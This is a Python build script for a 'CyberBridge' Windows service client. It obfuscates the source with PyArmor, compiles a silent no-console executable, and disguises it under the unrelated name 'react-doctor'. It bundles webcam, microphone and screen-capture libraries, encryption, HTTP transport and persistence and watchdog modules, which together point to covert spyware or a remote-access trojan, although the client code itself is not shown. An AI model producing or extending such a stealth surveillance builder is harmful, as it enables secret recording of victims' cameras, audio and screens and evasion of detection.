"""
CyberBridge - PyInstaller build script
Compiles the Windows Service client into a single .exe

Usage:
  python build_client.py            # builds the .exe
  dist\\CyberBridgeSvc.exe install   # installs the service (run as Admin)
  dist\\CyberBridgeSvc.exe start     # starts the service
  dist\\CyberBridgeSvc.exe stop      # stops the service
  dist\\CyberBridgeSvc.exe remove    # uninstalls the service
"""

import os
import subprocess
import sys

CLIENT_SCRIPT = os.path.join("obf_dist", "client", "service.py")
OUTPUT_NAME   = "react-doctor"    # Professional service name
ICON_PATH     = None                # Set to .ico path if available

# ─── Obfuscation Step ─────────────────────────────────────────────────────────
OBF_DIR = "obf_dist"
print("[CyberBridge] Obfuscating source code with PyArmor...")
import shutil
if os.path.exists(OBF_DIR):
    shutil.rmtree(OBF_DIR)

pyarmor_exe = "pyarmor"
if sys.platform == "win32":
    # For Windows App Store Python
    local_scripts = os.path.join(os.environ.get("LOCALAPPDATA", ""), "Packages", "PythonSoftwareFoundation.Python.3.12_qbz5n2kfra8p0", "LocalCache", "local-packages", "Python312", "Scripts", "pyarmor.exe")
    # Typical location for pip install --user
    user_scripts = os.path.join(os.environ.get("APPDATA", ""), "Python", f"Python{sys.version_info.major}{sys.version_info.minor}", "Scripts", "pyarmor.exe")
    
    if os.path.exists(local_scripts):
        pyarmor_exe = local_scripts
    elif os.path.exists(user_scripts):
        pyarmor_exe = user_scripts
    elif os.path.exists(os.path.join(os.path.dirname(sys.executable), "Scripts", "pyarmor.exe")):
        pyarmor_exe = os.path.join(os.path.dirname(sys.executable), "Scripts", "pyarmor.exe")

try:
    subprocess.run([pyarmor_exe, "gen", "-O", OBF_DIR, "-r", "client", "shared"], check=True)
except Exception as e:
    print(f"PyArmor obfuscation failed: {e}")
    sys.exit(1)


cmd = [
    sys.executable, "-m", "PyInstaller",
    "--onefile",                    # Single .exe
    "--noconsole",                  # No console window — completely silent
    "--clean",                      # Fresh build
    "--name", OUTPUT_NAME,
    "--add-data", f"{OBF_DIR}{os.sep}shared{os.pathsep}shared",
    "--add-data", f"{OBF_DIR}{os.sep}client{os.pathsep}client",

    # ── Windows Service requirements ─────────────────────────────────────────
    "--hidden-import", "win32serviceutil",
    "--hidden-import", "win32service",
    "--hidden-import", "win32event",
    "--hidden-import", "servicemanager",
    "--hidden-import", "win32api",
    "--hidden-import", "win32con",
    "--hidden-import", "win32security",
    "--hidden-import", "pywintypes",
    "--hidden-import", "winreg",
    "--hidden-import", "win32com.client",
    "--hidden-import", "win32timezone",  # Critical for service logging

    # ── HTTP transport (replaces RPyC) ──────────────────────────────────────
    "--hidden-import", "requests",
    "--hidden-import", "requests.adapters",
    "--hidden-import", "requests.auth",
    "--hidden-import", "urllib3",
    "--hidden-import", "urllib.request",
    "--hidden-import", "urllib.parse",
    "--hidden-import", "http.client",

    # ── Monitoring libs ──────────────────────────────────────────────────────
    "--hidden-import", "psutil",
    "--hidden-import", "cv2",
    "--hidden-import", "pyaudio",
    "--hidden-import", "PIL",
    "--hidden-import", "PIL.Image",
    "--hidden-import", "PIL.ImageGrab",
    "--hidden-import", "cryptography",
    "--hidden-import", "cryptography.fernet",
    "--hidden-import", "cryptography.hazmat.primitives.ciphers",

    # ── Standard library (missed by MS Store Python) ─────────────────────────
    "--hidden-import", "uuid",
    "--hidden-import", "audioop",
    "--hidden-import", "wave",
    "--hidden-import", "json",
    "--hidden-import", "socket",
    "--hidden-import", "threading",
    "--hidden-import", "subprocess",
    "--hidden-import", "logging",
    "--hidden-import", "logging.handlers",
    "--hidden-import", "hashlib",
    "--hidden-import", "base64",
    "--hidden-import", "io",
    "--hidden-import", "time",
    "--hidden-import", "shutil",
    "--hidden-import", "ctypes",
    "--hidden-import", "ctypes.wintypes",
    "--hidden-import", "platform",
    "--hidden-import", "core.watchdog",
    "--hidden-import", "core.persistence",

    "--distpath", "dist",
    "--workpath", "build",
    "--specpath", ".",
    CLIENT_SCRIPT,
]

if ICON_PATH and os.path.exists(ICON_PATH):
    cmd += ["--icon", ICON_PATH]

print("[CyberBridge] Building Windows Service .exe…")
subprocess.run(cmd, check=True)
print(f"\n[CyberBridge] Done! → dist/{OUTPUT_NAME}.exe")
print()
print("── Next steps (run as Administrator) ──────────────────────")
print(f"  dist\\{OUTPUT_NAME}.exe install   ← register service")
print(f"  dist\\{OUTPUT_NAME}.exe start     ← start service")
print(f"  dist\\{OUTPUT_NAME}.exe stop      ← stop service")
print(f"  dist\\{OUTPUT_NAME}.exe remove    ← uninstall service")
print("────────────────────────────────────────────────────────────")
